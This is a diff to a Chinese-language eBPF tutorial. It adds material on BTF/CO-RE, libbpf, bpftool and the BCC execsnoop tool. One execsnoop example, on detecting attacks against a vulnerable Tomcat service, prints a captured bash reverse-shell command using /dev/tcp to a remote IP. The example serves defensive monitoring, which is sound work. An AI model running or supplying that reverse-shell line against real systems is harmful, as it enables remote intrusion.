@@ -909,7 +909,40 @@ func _BpfClose(closers ...io.Closer) error {
 var _BpfBytes []byte
 ```
 
-####  相关工具
+##  0x04    CO-RE技术
+本小节部分内容参考[BPF CO-RE 参考指南 (2021)](https://mozillazg.com/2024/07/bpf-core-reference-guide-zh.html)
+
+####    背景
+eBPF 代码作为从用户空间向内核空间注入的代码，通常需要访问内核数据结构（某些 eBPF 程序可能只需要 trace 一些系统调用，所以可以不关注内核数据结构）。因此，内核数据结构本质上就是面向 eBPF 代码的协议，一旦发生改变，eBPF 代码在运行时将有可能导致未知的问题。因此目前常见的方式就是将内核头文件与 eBPF 代码一起编译，因此衍生这几种方式（共同点是无法摆脱对内核头文件的依赖）：
+
+1.  原始模式：人为绑定编译（目标）机器上的kernel头文件，然后和 eBPF 代码一起编译，比如LKM 的开发方式
+2.  BCC 的 on the fly 编译：BCC 会默认（目标）机器 上已经装上了准确的内核头文件，然后 BCC 对用户提供的 Python 的 binding，用户可以用 C 来写一段 eBPF 代码，然后这段代码被 Python 当成纯文本调用 LLVM 和对应的内核头文件进行编译加载执行。用此方式写 tool 运行性能得非常低，而且需要加载的 share object 也非常大
+
+上述两种方式，都无法摆脱对内核头文件的依赖，一旦用在对应内核环境下编译除了一个 binary，换了一个内核环境极有可能就无法运行了。问题的本质是一个 Relocation（重定位）的问题，即当 eBPF 代码访问内核数据结构时，它必须准确知道当前这个数据结构在内核中的 memory layout，也就是某个 field 到底在哪个 offset。假如 eBPF 代码需要访问 `struct task_struct`这个结构，如果 eBPF 代码使用的 `task_struct` 和实际运行内核中运行的 `task_struct` 不一致，比如实际内核运行的 `task_struct` 在需要 eBPF 代码要访问的 field 前面又新增了一些 fileld，这就导致 offset 发生了改变，eBPF 代码将读到错误的数据；如果需要访问的 field 发生了重命名或被删除，又或者不同的 Kconfig，同一份内核编译出不同的 struct，都会对 binary的运行造成影响
+
+####    BTF 和 CO-RE（Compile Once，Run Everywhere
+为了解决上述问题，内核引入了BTF机制（轻量），要用一种相对抽象的方式去描述 eBPF 和内核的数据结构的元数据，然后在加载时让加载器基于这些元数据来完成Relocation。只要开启了 BTF 功能（`CONFIG_DEBUG_INFO_BTF=y` ，Linux 5.2 里引入），就可以将内核数据结构的描述内嵌于内核中（`/sys/kernel/btf/vmlinux`），此外，这部分 BTF 信息还可以等价转换为 C 描述（即 header 文件 `vmlinux.h`）。这样只要引入`vmlinux.h`，在写代码的时候就无需引入其他内核头文件（各个不同版本），就可以使用全部的内核数据结构
+
+BTF格式及定义可参考：[BPF Type Format (BTF)](https://www.kernel.org/doc/html/latest/bpf/btf.html)
+
+一个完整的 CO-RE 能力需要以下几个组件的互相配合：
+
+-   Linux 内核支持暴露 BTF 格式的数据结构
+-   Clang 编译器可将 eBPF 对内核数据结构的访问记录成相应的重定位信息保存在 ELF 文件的 section 中
+-   BPF Loader（ [`libbpf`](https://github.com/libbpf/libbpf)）可以在加载的时候通过[读取内核](https://github.com/libbpf/libbpf/blob/master/src/btf.c#L4541) BTF 和 eBPF 的重定位信息来修正访问信息，完成最终的[重定位](https://github.com/libbpf/libbpf/blob/master/src/libbpf.c#L6561)
+-   `libbpf` 支持对 eBPF 暴露 Kconfig 配置或者 `struct flavor` 机制来兼容不同的内核数据结构改名或者含义不同的情况
+
+所以，技术选型的思路大概是：
+-   优先`libbpf` + BTF + CO-RE 这套方案
+-   不支持BTF（或未开启BTF）的 eBPF 内核，需要分别适配，需下载对应系统内核`kernel-header-dev`包，和内核热补丁适配方式相同
+
+####    再看libbpf
+libbpf 是基于 BTF 和 CO-RE (Compile-Once Run-Everywhere) 提供了更好的便携性（兼容新旧内核版本）：
+
+-   BTF 是 BPF 类型格式，用于避免依赖 Clang 和内核头文件
+-   CO-RE 则使得 BTF 字节码支持重定位，避免 LLVM 重新编译的需要
+
+##  0x05  ebpf相关工具
 
 1、`bpftool map`
 
@@ -923,16 +956,83 @@ bpftool map
         frozen
 ```
 
-##  0x04    汇总
+2、`bpftrace -l`：查看系统可以
+
+3、`execsnoop-bpfcc`
+
+```bash
+apt-get install bpfcc-tools linux-headers-$(uname -r)
+```
+
+####    bpftool的使用
+[bpftool cheatsheet](https://zyy.rs/post/bpftool-cheatsheet/)
+
+####    BCC的使用
+BCC（BPF Compiler Collection），强大的内核分析工具，利用这个库可以从底层获取操作系统性能信息，网络性能信息等许多与内核交互的信息
+
+```BASH
+apt install bpfcc-tools
+#使用BCC也需要安装当前系统内核版本所对应的头文件
+#BCC工具在编译eBPF字节码时，依赖这些内核头文件
+apt install linux-headers-`uname -r`
+```
+
+1、场景1：进程追踪
+
+`execsnoop` 工具会打印出`execve`系统调用的实时执行情况
+
+```BASH
+root@debian:~# execsnoop-bpfcc
+PCOMM            PID    PPID   RET ARGS
+sh               842858 7234     0 /bin/sh -c ../../monitor/barad/admin/trystart.sh
+dirname          842860 842859   0 /usr/bin/dirname ../../monitor/barad/admin/trystart.sh
+trystart.sh      842859 842858   0 ../../monitor/barad/admin/trystart.sh
+chmod            842861 842859   0 
+ps               842863 842862   0 /usr/bin/ps ax
+grep             842864 842862   0 /usr/bin/grep barad_agent
+grep             842865 842862   0 /usr/bin/grep -v grep
+wc               842866 842862   0 /usr/bin/wc -l
+ps               842868 842867   0 /usr/bin/ps axo rss,comm
+grep             842869 842867   0 /usr/bin/grep barad_agent
+awk              842870 842867   0 /usr/bin/awk {print $1}
+sh               842872 8372     0 /bin/sh -c npu-smi info -l
+sh               842873 8372     0 /bin/sh -c npu-smi info -l
+sh               842874 8372     0 /bin/sh -c npu-smi info
+```
+
+比如在主机安全场景，部分Web服务可能存在漏洞导致远程命令执行，那么如何对Web服务执行命令的行为进行监控呢？可以使用`execsnoop`工具，通过`-u`参数，指定对Web服务进程的`uid`进行过滤，就可以看到该用户所有调用`execve`的情况（如下面示例）
+
+```BASH
+#对搭建了fastjson反序列化漏洞的tomcat用户进行execsnoop监控，攻击者通过反序列化POC获取了反弹shell，并执行了whoami命令
+root@debian:~# execsnoop-bpfcc -u tomcat
+PCOMM            PID    PPID   RET ARGS
+bash             68335  68282    0 /bin/bash -c exec 5<>/dev/tcp/192.168.195.1/1888;cat <&5 | while read line; do $line 2>&5 >&5; done
+cat              68336  68335    0 /bin/cat
+whoami           68338  68337    0 /usr/bin/whoami
+```
+
+使用BCC/eBPF的方式具有以下优点：
+
+-   应用层无感知，无需重启Web服务，可在运行时随时启动或退出监控（直接`Ctrl-C`停止`execsnoop`退出）
+-   在内核`execve`系统调用处进行记录，即使进行`bash`命令混淆，还是可以看到最终执行的真实命令
+
+##  0x06    汇总
 
 -   ebpf+openssl：实现对 https 明文的捕获，参考项目[ecapture](https://github.com/gojue/ecapture)
 -   ebpf+openssh命令审计：使用[libbpfgo](https://github.com/aquasecurity/libbpfgo)库开发的，可以实现对openssh登录（bash）场景下的命令捕获，参考[teleport](https://github.com/gravitational/teleport/tree/aa91ad4a972d70b2c1a88fd5ea424b93760e2b43/bpf)
--   
+-   [ebpf学习路线](https://davidlovezoe.club/wordpress/archives/tag/bpf)
+-   [LINUX超能力BPF技术介绍及学习分享（附PPT）](https://davidlovezoe.club/wordpress/archives/1122)：初学者入门好文
+-   [eBPF 开发者教程与知识库：eBPF Tutorial by Example](https://github.com/eunomia-bpf/bpf-developer-tutorial/blob/main/README.zh.md)
 
-##  0x05   有用的资料
+####  内核态开发
+内核态代码入门可以阅读[eBPF 开发实践教程](https://eunomia.dev/zh/tutorials/)
+
+####  用户态开发
+
+##  0x07   有用的资料
 -   [eBPF应用程序开发：快人一步](https://www.cnxct.com/ebpf-application-development-beyond-basics-zh_cn/)
 
-##  0x05    参考
+##  0x08    参考
 -   [Linux 中基于 eBPF 的恶意利用与检测机制](https://tech.meituan.com/2022/04/07/how-to-detect-bad-ebpf-used-in-linux.html)
 -   [常见 bash 监控方案](https://blog.spoock.com/2024/01/17/bash-monitor/)
 -   [eBPF 概念和基本原理](https://blog.fleeto.us/post/what-is-ebpf/)
@@ -955,3 +1055,5 @@ bpftool map
 -   [eBPF开发专题](https://mp.weixin.qq.com/mp/appmsgalbum?__biz=MzkzODYyNzU2Mw==&action=getalbum&album_id=3396241093339414533&scene=173&subscene=&sessionid=svr_7d11fa17677&enterid=1723464100&from_msgid=2247484395&from_itemidx=1&count=3&nolastread=1#wechat_redirect)
 -   [EBPF文章翻译(1)—EBPF介绍](https://davidlovezoe.club/wordpress/archives/867)
 -   [BPF CO-RE (Compile Once – Run Everywhere)](https://nakryiko.com/posts/bpf-portability-and-co-re/)
+-   [BPF 可移植性和 CO-RE](http://arthurchiao.art/blog/bpf-portability-and-co-re-zh/)
+-   [eBPF 的 CO-RE 特性](https://zyy.rs/post/ebpf-core-feature/)
